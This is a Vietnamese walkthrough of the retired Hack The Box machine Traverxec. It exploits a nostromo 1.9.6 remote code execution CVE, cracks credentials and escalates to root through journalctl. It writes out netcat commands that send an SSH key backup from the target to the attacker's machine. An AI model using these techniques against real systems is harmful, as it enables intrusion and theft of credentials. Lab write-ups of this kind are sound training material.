## 0. Mở đầu

Hiện tại machine đã được cho vào mục **retired machine** nên mình đã public write-up !

Cơ bản về machine:

![](https://images.viblo.asia/69a15881-875b-4743-8c29-64c07193813f.png)

Machine được đánh giá ở mức độ Easy, release ngày 16/11/2019 (cũng khá lâu rồi), IP của machine là **10.10.10.165**.

![](https://images.viblo.asia/bbca7d6c-9820-4b68-8e79-eb01fd2ceadb.png)

Về matrix-rate, điều chút tâm đầu tiên là việc **Enumeration** của User Flag rất là thấp, cùng với đó là chắc chắn Machine liên quan tới CVE nào đó. Việc custom exploit cũng thấp. Cũng không quá ngạc nhiên khi đây là một machine Easy.

Giao diện khi truy cập qua browser khá thân thiện :v: 

![](https://images.viblo.asia/4879f050-0281-4afb-aa2f-f2456cbebc52.png)


Let's start.

## 1. User Flag

Sau khi quét bằng Nmap, chúng ta chỉ thấy 2 port được mở là port 80 và 22. Khá ít! Vì có một cách "làm khó người chơi" đó là mở nhiều port và chạy những service tưởng như lỗi mà không lỗi :laughing:, nhưng dẫu sao đây cũng là một bài Easy !

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

Trong đó port 80 chạy dịch vụ **nostromo 1.9.6**. Phiên bản này có [CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278) có thể dẫn tới Remote Code Execute.

Metasploit đã có sẵn module để khai thác, tuy nhiên chúng ta sẽ hạn chế dùng nó, mà sẽ dùng script có sẵn của CVE trên. Tại đây ta mở một reverse shell.

![](https://images.viblo.asia/c5e796ea-f79b-4b93-87d4-2d3aa3a178a3.png)

Vậy là đã có shell dưới tên www-data. Tại đây mình đã tải Linux Smart Enumeration về thư mục **/tmp/** để chạy. Ra password file (hashed) của user **david**.

![](https://images.viblo.asia/1d92e6f4-3753-4c50-9f53-445d50e3b919.png)

Sau khi decrypt thì giá trị của nó là **Nowonly4me**. Nhưng không thể dùng ssh tới hay swtich user. Tuy nhiên hãy truy cập vào đường dẫn của file kia xem sao? Tại: **/var/nostromo/conf/**

![](https://images.viblo.asia/5671d5d1-a425-4194-8380-2f728279ab0c.png)

Xem thử nội dung file config, đây là một loại file yêu thích trong tất cả các thể loại machine, song song với file chứa credentials, ssh, back up...:

![](https://images.viblo.asia/f7558c9d-06ee-43b4-aa74-ef488c8234d9.png)

Tại file thư mục **/home/** còn có thêm thư mục **public_www**, sau khi truy cập thử thì đây là folder của user **david**. Cùng truy cập đến và xem xét những gì có ở trong, ta thấy một file  back up:

![](https://images.viblo.asia/a5da3397-80aa-4d28-89eb-9f7de33218e1.png)


Tại đây có một thư mục **protected-file-area**, sau khi liệt kê files chúng ta thấy có 1 file backup ssh, khá quan trọng vì Machine chỉ mở thêm port 22: **backup-ssh-identity-files.tgz**. Chúng ta chuyển file đó về localhost:

Tại remote host: 

```
nc IP_LOCAL_HOST PORT < file_name
```

Tại Localhost:

```
nc -nvlp PORT > file_name
```

Sau khi tải về:

![](https://images.viblo.asia/ca63a95a-1b45-457f-b622-78fa97aefa04.png)


Decrypt public key với john:

![](https://images.viblo.asia/a4d79c86-c166-440e-a562-56bedab03104.png)

Ta có password cho id_rsa là **hunter**, dùng nó để ssh tới machine dưới tên **david** và lấy  **user flag**:

![](https://images.viblo.asia/44de3797-71e9-4b05-9dc5-636ef8be237c.png)

## 2. Root Flag

Có một điều đặc biệt là tại thư mục **/home/david/** có một thư mục bin (binary), vào thử xem sao:

![](https://images.viblo.asia/b3dfd09b-1d2e-4915-8a52-3fda94e9c1dd.png)

Chạy thử file thực thi thì ra kết quả như trên, hãy xem nội dung của nó:

![](https://images.viblo.asia/4c8b6da6-1db4-44e9-892e-d95af86f70f6.png)

Tại đây chúng ta thấy có **journalctl** được chạy dưới quyền Root mà không cần password. Nhưng làm sao để leo quyền?

Việc leo quyền với **journalctl** rất đơn giản, chỉ cần:

![](https://images.viblo.asia/615b4c34-bb15-431c-adb1-405840fe1851.png)

Nhưng không được đâu sói ạ:

![](https://images.viblo.asia/b24b6ed4-ae96-4e42-9f0c-f4c9aa21c3e8.png)

Research thêm đi...

Các bạn đọc tạm dừng 10 phút để đi đến đây và thử leo quyền xem sao, rất thú vị và mình chưa gặp bao giờ:

Vâng cách leo quyền với **journalctl** đó là...thu nhỏ cửa sổ của Terminal, các bạn thấy nó "ngắn" hơn bên trên chưa ạ ? 

![](https://images.viblo.asia/7d676f40-cff9-437e-91ab-b109c361fc3a.png)

Thật thú vị và bất ngờ, giờ thì cùng cat flag thôi !

![](https://images.viblo.asia/e724795c-6314-4617-a72c-08a3276a5b13.png)

## 3. Kết luận

Machine khá cơ bản và khá hay, phù hợp để làm quen, tập luyện. Sau một thời gian nghỉ chơi hackthebox mình đã chọn nó để khởi động. Hi vọng bài write-up có thể giúp các bạn gỡ rối, đặc biệt là bước lên Root :joy: